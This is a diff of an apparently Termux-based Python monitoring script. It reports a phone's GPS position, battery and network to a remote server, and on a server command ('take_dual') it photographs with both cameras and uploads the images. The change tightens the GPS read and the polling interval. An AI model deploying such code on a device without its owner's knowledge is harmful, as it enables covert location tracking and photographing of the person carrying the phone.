@@ -46,35 +46,12 @@ def obter_status_rede():
         except: pass
     return "Dados Moveis"
 
-def obter_gps_forcado():
-    """Força uma NOVA leitura do GPS a cada chamada"""
-    try:
-        # Mata qualquer processo de GPS pendente
-        run_command("pkill -f termux-location 2>/dev/null")
-        time.sleep(0.5)
-        
-        # Força uma nova consulta
-        resultado = run_command("termux-location -p gps -r once")
-        
-        if resultado:
-            dados = json.loads(resultado)
-            lat = dados.get("latitude")
-            lon = dados.get("longitude")
-            
-            # Só aceita valores válidos e diferentes de zero
-            if lat and lon and float(lat) != 0 and float(lon) != 0:
-                return float(lat), float(lon)
-    except:
-        pass
-    
-    return None, None
-
 def capturar_e_enviar_foto(tipo, numero_camera):
     if os.path.exists(ARQUIVO_FOTO):
         os.remove(ARQUIVO_FOTO)
     
     run_command(f"termux-camera-photo -c {numero_camera} {ARQUIVO_FOTO}")
-    time.sleep(1.5)
+    time.sleep(2)
     
     if os.path.exists(ARQUIVO_FOTO) and os.path.getsize(ARQUIVO_FOTO) > 0:
         with open(ARQUIVO_FOTO, "rb") as img_file:
@@ -88,13 +65,13 @@ def capturar_e_enviar_foto(tipo, numero_camera):
             pass
     return False
 
-print("🛰️  INICIANDO MONITORAMENTO GPS...\n")
+print("🛰️  INICIANDO MONITORAMENTO...\n")
 
 # Loop principal
 while True:
     timestamp_atual = datetime.now()
     
-    # BATERIA
+    # BATERIA - comando rápido
     battery = "N/A"
     out_bat = run_command("termux-battery-status")
     if out_bat:
@@ -103,15 +80,19 @@ while True:
             battery = str(bat_data.get("percentage", "N/A"))
         except: pass
     
-    # GPS FORÇADO - Nova leitura a cada ciclo
-    lat_novo, lon_novo = obter_gps_forcado()
-    
-    if lat_novo and lon_novo:
-        ultima_lat_valida = lat_novo
-        ultima_lon_valida = lon_novo
-        gps_ok = True
-    else:
-        gps_ok = False
+    # GPS - SEM PKILL, SEM SLEEP
+    gps_ok = False
+    out_loc = run_command("termux-location -p gps -r once")
+    if out_loc:
+        try:
+            loc_data = json.loads(out_loc)
+            lat_novo = loc_data.get("latitude")
+            lon_novo = loc_data.get("longitude")
+            if lat_novo and lon_novo and float(lat_novo) != 0 and float(lon_novo) != 0:
+                ultima_lat_valida = float(lat_novo)
+                ultima_lon_valida = float(lon_novo)
+                gps_ok = True
+        except: pass
     
     # UPTIME
     uptime = str(datetime.now() - inicio_operacao).split('.')[0]
@@ -126,7 +107,6 @@ while True:
         "lat": ultima_lat_valida,
         "lon": ultima_lon_valida,
         "network": rede,
-        "gps_ativo": gps_ok,
         "timestamp": timestamp_atual.isoformat()
     }
     
@@ -137,11 +117,7 @@ while True:
             comando_cam = str(res_data.get("comando_cam", "wait")).lower()
             
             gps_icon = "📍" if gps_ok else "📡"
-            print(f"{gps_icon} [{timestamp_atual.strftime('%H:%M:%S')}] Bat:{battery}% | {rede}")
-            if gps_ok:
-                print(f"   GPS: {ultima_lat_valida:.6f}, {ultima_lon_valida:.6f}")
-            else:
-                print(f"   GPS: Aguardando sinal...")
+            print(f"{gps_icon} [{timestamp_atual.strftime('%H:%M:%S')}] Bat:{battery}% {rede}")
             
             if comando_cam == "take_dual":
                 print("📸 [DUAL] Capturando...")
@@ -149,8 +125,10 @@ while True:
                 time.sleep(0.5)
                 ok2 = capturar_e_enviar_foto("front", 1)
                 
-                if ok1 or ok2:
+                if ok1 and ok2:
                     print("   ✅ Fotos enviadas!")
+                elif ok1 or ok2:
+                    print("   ⚠️ Apenas uma foto enviada")
                 else:
                     print("   ❌ Falha nas fotos")
                 
@@ -159,4 +137,4 @@ while True:
     except Exception as e:
         print(f"⚠️ {str(e)[:50]}")
     
-    time.sleep(5.0)
+    time.sleep(3.0)
